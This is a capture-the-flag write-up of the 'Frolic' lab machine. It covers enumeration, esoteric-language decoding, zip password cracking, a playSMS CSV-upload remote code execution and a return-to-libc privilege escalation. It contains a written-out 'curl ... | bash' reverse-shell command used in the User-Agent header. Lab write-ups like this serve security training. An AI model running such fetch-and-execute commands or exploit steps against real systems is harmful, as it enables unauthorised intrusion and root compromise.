---
description: Easy machine OSCP style
---

# Frolic

## Reconnaissance

First of all we ensure that the machine is up and because of the TTL we can know that it is a Linux machine (64).

<figure><img src="../.gitbook/assets/Captura de pantalla 2023-04-09 a las 17.08.17.png" alt=""><figcaption></figcaption></figure>

First scanning for all open ports.

<figure><img src="../.gitbook/assets/Captura de pantalla 2023-04-09 a las 17.14.33.png" alt=""><figcaption></figcaption></figure>

At this point where we know the ports that are open, we can perform a version scan to egt further information about the services running on those open ports. As we can see, it is displayed the smb version of the services running on ports 139 and 445 and the http servers running on ports 1880 and 9999.

<figure><img src="../.gitbook/assets/Captura de pantalla 2023-04-09 a las 17.23.06.png" alt=""><figcaption></figcaption></figure>

In order to enumerate the shared drives on the entire domain we use the tool `smbmap.` As we can see, we have no permissions to access any of the shared drives.

<figure><img src="../.gitbook/assets/Captura de pantalla 2023-04-09 a las 17.48.38.png" alt=""><figcaption></figcaption></figure>

After moving on to the http servers, we start fuzzing in order to find interesting directories on the different servers. On the http server running on port 9999 we find some interesting directories called admin, test, backup and dev.

<figure><img src="../.gitbook/assets/Captura de pantalla 2023-04-09 a las 18.37.05 (1).png" alt=""><figcaption></figcaption></figure>

## Exploitation

The http server on port 1880 is just a login panel to a service called node-red but as we do not have credentials we are not able to log in.

<figure><img src="../.gitbook/assets/Captura de pantalla 2023-04-09 a las 18.37.26.png" alt=""><figcaption></figcaption></figure>

Returning to the server on port 9999 and looking at the source code of the login panel shown in the admin directory, it is loading a javascript script called login.js.

<figure><img src="../.gitbook/assets/Captura de pantalla 2023-04-09 a las 18.37.52.png" alt=""><figcaption></figcaption></figure>

As we can see in the content of the script, there are credentials in clear and also we can know the path of the file which is redirected to when the user inputs the correct credentials.&#x20;

<figure><img src="../.gitbook/assets/Captura de pantalla 2023-04-09 a las 18.38.03.png" alt=""><figcaption></figcaption></figure>

Once logged in, we can see some weird characters.&#x20;

{% hint style="info" %}
After some time spent and some write ups viewed I got to the conclusion that this piece of text refers to a esoteric programming language called Ook.

Esoteric programming languages are different from the regular programming languages often created as jokes or challenges.
{% endhint %}

<figure><img src="../.gitbook/assets/Captura de pantalla 2023-04-09 a las 18.37.38.png" alt=""><figcaption></figcaption></figure>

The Ook language uses the word Ook before ".", "?" and "!" so as the text only has these characters, we deduced that it could be an uncompleted Ook code. In order to decode this Ook code we needed to add the Ook word before every character as it is shown in the image below.&#x20;

<figure><img src="../.gitbook/assets/Captura de pantalla 2023-04-09 a las 19.27.49.png" alt=""><figcaption></figcaption></figure>

I used an online decoder to view the result of the Ook code.&#x20;

<figure><img src="../.gitbook/assets/Captura de pantalla 2023-04-09 a las 19.28.23.png" alt=""><figcaption></figcaption></figure>

After decoding the text it shows a path and when accessing this path we find another piece of text that seems to be encoded in base64.&#x20;

<figure><img src="../.gitbook/assets/Captura de pantalla 2023-04-09 a las 19.29.32.png" alt=""><figcaption></figcaption></figure>

If we decode it and use xxd to display in hexadecimal. Due to the first bytes that are 504b 0304 we can think that it is a zip file.&#x20;

<figure><img src="../.gitbook/assets/Captura de pantalla 2023-04-09 a las 19.34.49.png" alt=""><figcaption></figcaption></figure>

After getting the zip file we try to decompress it and it is encrypted with a password.

<figure><img src="../.gitbook/assets/Captura de pantalla 2023-04-09 a las 19.37.34.png" alt=""><figcaption></figcaption></figure>

With zip2john we generate the hash to then crack the password using john.

<figure><img src="../.gitbook/assets/Captura de pantalla 2023-04-09 a las 19.39.40.png" alt=""><figcaption></figcaption></figure>

With the tool john the ripper and using the rockyou dictionary we get the password of the zip file.&#x20;

<figure><img src="../.gitbook/assets/Captura de pantalla 2023-04-09 a las 19.41.06.png" alt=""><figcaption></figcaption></figure>

Once decompressed, we can show the content of the file called index.php inside the zip file. As it can be seen in the image below, it seems to be a set of bytes. At this point, we can use again the command xxd but with the options -r (reverse) to do the reverse operation (from hex to binary). The result seems to be a base64 encoded text.

<figure><img src="../.gitbook/assets/Captura de pantalla 2023-04-09 a las 19.43.42.png" alt=""><figcaption></figcaption></figure>

Once decoded, a weird peice of text is shown.

{% hint style="info" %}
It is a piece of code written in Brainfuck, another esoteric programming language.&#x20;
{% endhint %}

<figure><img src="../.gitbook/assets/Captura de pantalla 2023-04-09 a las 19.57.40.png" alt=""><figcaption></figcaption></figure>

With the same online converter we decode the piece of text and a password is shown.

<figure><img src="../.gitbook/assets/Captura de pantalla 2023-04-09 a las 19.59.18.png" alt=""><figcaption></figcaption></figure>

After testing with the password to try to log in in the http server on port 1880 (the one left), we noticed that there was something missing as the password is supposed to be used somewhere. Despite that we have not access to the /dev directory, with a fuzzer we can list some other directories inside the /dev direcory.&#x20;

<figure><img src="../.gitbook/assets/Captura de pantalla 2023-04-09 a las 20.02.24.png" alt=""><figcaption></figcaption></figure>

Looking into the /backup directory, it is shown another directory called /playsms.

<figure><img src="../.gitbook/assets/Captura de pantalla 2023-04-09 a las 20.02.58.png" alt=""><figcaption></figcaption></figure>

Accessing this path, we find a login panel.

<figure><img src="../.gitbook/assets/Captura de pantalla 2023-04-09 a las 20.03.14.png" alt=""><figcaption></figcaption></figure>

With the password found before we are able to log in.&#x20;

<figure><img src="../.gitbook/assets/Captura de pantalla 2023-04-09 a las 20.04.32.png" alt=""><figcaption></figcaption></figure>

After that we look for vulnerabilities of the service and we find remote code execution vulnerabilities.

<figure><img src="../.gitbook/assets/Captura de pantalla 2023-04-09 a las 20.21.48.png" alt=""><figcaption></figcaption></figure>

Looking at the content of the exploit, we can see a proof of concept which shows the vulnerable url and the payload of the exploit.

<figure><img src="../.gitbook/assets/Captura de pantalla 2023-04-09 a las 20.24.02.png" alt=""><figcaption></figcaption></figure>

The vulnerability is shown here, where we can upload a .csv file which enables an attacker to run commands on the target machine.&#x20;

<figure><img src="../.gitbook/assets/Captura de pantalla 2023-04-09 a las 20.24.10.png" alt=""><figcaption></figcaption></figure>

This is the content of the file. It is a .csv and uses the User\_Agent header to run commands on the victim machine.

<figure><img src="../.gitbook/assets/Captura de pantalla 2023-04-09 a las 20.26.55.png" alt=""><figcaption></figcaption></figure>

With Burpsuite, we are going to intercept the http request to upload the .csv file in order to modify the User Agent value to the command that we want to execute.&#x20;

<figure><img src="../.gitbook/assets/Captura de pantalla 2023-04-09 a las 20.39.02.png" alt=""><figcaption></figcaption></figure>

After forwarding the request, we can see the result of the command on the name field of the table, in this case the executed command was `id.`

<figure><img src="../.gitbook/assets/Captura de pantalla 2023-04-09 a las 20.40.50.png" alt=""><figcaption></figcaption></figure>

Now we create a file called index.html with a reverse shell.

<figure><img src="../.gitbook/assets/Captura de pantalla 2023-04-09 a las 20.53.37.png" alt=""><figcaption></figcaption></figure>

To get the reverse shell, we set up an http server on the local host and when intercepting the request, the User Agent value will be the following:

```
curl 10.10.10.111 | bash
```

This piece of code basically gets the content of the index.html file and interprets it with bash, sending a shell to the server listening on port 443 on local host.

<figure><img src="../.gitbook/assets/Captura de pantalla 2023-04-11 a las 12.10.42.png" alt=""><figcaption></figcaption></figure>

## Privilege escalation

We get the shell as www-data. At this point we are able to get the user flag. After that, we need to escalate to get administrative privileges so we look if we have sudo privileges. Then we look for suid privileges and notice that there is a suspicious file in `/home/ayush/.binary/rop`.&#x20;

<figure><img src="../.gitbook/assets/Captura de pantalla 2023-04-11 a las 12.19.16.png" alt=""><figcaption></figcaption></figure>

This file is owned by root but it can be executed by another user with root privileges.&#x20;

<figure><img src="../.gitbook/assets/Captura de pantalla 2023-04-11 a las 12.26.22.png" alt=""><figcaption></figcaption></figure>

By executing the file, it requests for a message and by using a very large input a segmentation fault occurs.&#x20;

<figure><img src="../.gitbook/assets/Captura de pantalla 2023-04-11 a las 12.28.49.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/Captura de pantalla 2023-04-11 a las 12.37.27.png" alt=""><figcaption></figcaption></figure>

With `checksec` we check the properties of the file and we can see that NX is enabled which means that it is Non eXecutable.

<figure><img src="../.gitbook/assets/Captura de pantalla 2023-04-11 a las 12.39.33.png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
I used a tool called `gef` that shows the value of the registers when the program is executed so we can know in every time the content of the stack.
{% endhint %}

<figure><img src="../.gitbook/assets/Captura de pantalla 2023-04-11 a las 12.54.08.png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
The type of attack that is going to be performes is called Return to libc. This is basically overwritting the value of the register which pointers to the next instruction that is going to be executed (EIP --> Instruction Pointer).&#x20;
{% endhint %}

This tool enables the creation of a pattern to know what is the offset that must be used to overwrite the eip and in this case it is 52 characters.

<figure><img src="../.gitbook/assets/Captura de pantalla 2023-04-11 a las 12.55.42.png" alt=""><figcaption></figcaption></figure>

To ensure that the offset is correct, we print 52 As and 4 Bs so that the value of the EIP should be BBBB at the exectution of the program.

<figure><img src="../.gitbook/assets/Captura de pantalla 2023-04-11 a las 12.56.11.png" alt=""><figcaption></figcaption></figure>

Here we can see that the value of the EIP is "BBBB" so the offset is correct.

<figure><img src="../.gitbook/assets/Captura de pantalla 2023-04-11 a las 12.56.40.png" alt=""><figcaption></figcaption></figure>

To know if ASLR is being used we can execute this command and as the value is 0 it means that ASLR is disabled and no address randomization is used.&#x20;

<figure><img src="../.gitbook/assets/Captura de pantalla 2023-04-11 a las 12.58.17.png" alt=""><figcaption></figcaption></figure>

With `ldd` we can print the shared libraries that the program uses and we see that libc is used. Moreover, the start address is shown.

<figure><img src="../.gitbook/assets/Captura de pantalla 2023-04-11 a las 12.58.54.png" alt=""><figcaption></figcaption></figure>

With readelf we display information about the libc library to get the address of system and exit to then use this addresses to exploit the buffer overflow.&#x20;

<figure><img src="../.gitbook/assets/Captura de pantalla 2023-04-11 a las 13.03.57.png" alt=""><figcaption></figcaption></figure>

Moreover, in addition to the address of system and exit, we need the address of /bin/sh so this is the address that is going to be used by system to get a shell.

<figure><img src="../.gitbook/assets/Captura de pantalla 2023-04-11 a las 21.49.27.png" alt=""><figcaption></figcaption></figure>

With those addresses, we create an exploit with the offset and the addresses of the needed functions.&#x20;

{% hint style="info" %}
The addresses of the functions that were shown before are not the address of the functions but the offset to the start address of the libc base address. In result, the real address of the functions is the addtion of the base address and the offsets obtained.&#x20;
{% endhint %}

{% hint style="info" %}
Here little endian is used. To manage this, the python fucntion pack is used.&#x20;
{% endhint %}

<figure><img src="../.gitbook/assets/Captura de pantalla 2023-04-11 a las 21.56.21.png" alt=""><figcaption></figcaption></figure>

At this point we run the program with the payload created with the exploit.&#x20;

<figure><img src="../.gitbook/assets/Captura de pantalla 2023-04-11 a las 21.57.53.png" alt=""><figcaption></figcaption></figure>

We get a shell as root, which is the owner of the program with suid privileges.

<figure><img src="../.gitbook/assets/Captura de pantalla 2023-04-11 a las 21.59.24.png" alt=""><figcaption></figcaption></figure>

PWNED!

<figure><img src="../.gitbook/assets/Captura de pantalla 2023-04-11 a las 22.00.20.png" alt=""><figcaption></figcaption></figure>
